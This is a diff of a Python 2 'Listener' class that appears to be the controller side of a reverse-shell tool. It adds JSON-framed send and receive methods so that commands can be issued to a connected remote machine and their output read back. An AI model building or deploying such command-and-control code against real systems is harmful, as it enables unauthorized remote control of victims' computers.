@@ -5,6 +5,7 @@
 # Date -> 7/28/2018
 
 import socket
+import json
 
 class Listener:
     def __init__(self,ip,port):
@@ -18,9 +19,22 @@ class Listener:
         result = self.connection.recv(1024)
         print result
 
+    def reliable_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_recv(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def exec_remote(self,cmd):
-        self.connection.send(cmd)
-        return self.connection.recv(1024)
+        self.reliable_send(cmd)
+        return self.reliable_recv()
 
     def run(self):
         while True:
